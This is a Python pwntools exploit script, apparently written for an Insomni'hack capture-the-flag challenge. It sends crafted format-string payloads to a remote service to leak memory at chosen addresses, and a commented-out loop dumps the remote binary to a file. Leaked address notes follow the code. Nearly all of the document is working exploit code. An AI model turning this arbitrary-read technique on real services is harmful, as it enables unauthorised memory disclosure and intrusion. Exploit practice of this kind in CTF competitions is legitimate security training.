#!/usr/bin/python3
import struct
from pwn import *

context.log_level = "DEBUG"
context.timeout = 5
gs = '''
continue
'''

# 0x400934

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('covidless.insomnihack.ch', 6666)


def read_until(io,msg):
    out=b''
    # try:
    out+=io.recvuntil(msg)
    print(out)
    return out
    # except: return str(out)


def dump(io,addr, frmt=b's'):
    print('type> ',type(frmt))
    raw_adr= p64(addr)
    if b'\n' in raw_adr:
        return b""
    eof=b'EOF_espr'
    leak_part= b'|%19$'+ frmt+b'|EOF_espr'
    out=b''
    out+= leak_part.ljust(71-len(leak_part)-len(eof),b'A')
    out+=eof
    out+=p64(addr)
    # out+=leak_part
    io.sendline(out)
    r= read_until(io,'|EOF_espr')
    print('r> ',r)
    if len(r.split(b'|'))<2:
        print(r)
        input()
    return r.split(b'|')[1]



io = start()
# for i in range(1,10):

startb= 0x400934
addr= startb
binfile= b''


# addr=0x400000
# i=1
# m=4096
# while True:
#     with open('dump', 'ab') as f:
#         leak=b''
#         print("[*] leak 0x{:08x}".format(addr))
#         leak+=dump(io, addr,b's')
#         leak+=b'\x00'
#         addr+= len(leak)
#         f.write(leak)
#         f.flush()
#     i=i+1




# # io.recvline()
io.interactive()
# 0x400934
# 0x7ffdf9bbaba0
# 0x400890
# 0x7f95d42c6b97
# 0x7ffdf9bbaba8
# 0x40075a
# 0x400650
# 0x7ffdf9bbaba0

# 00000610
# 00000620
# 00000630
# 00000600
# 00000600
# 000005e0
# 00000640
# 00000737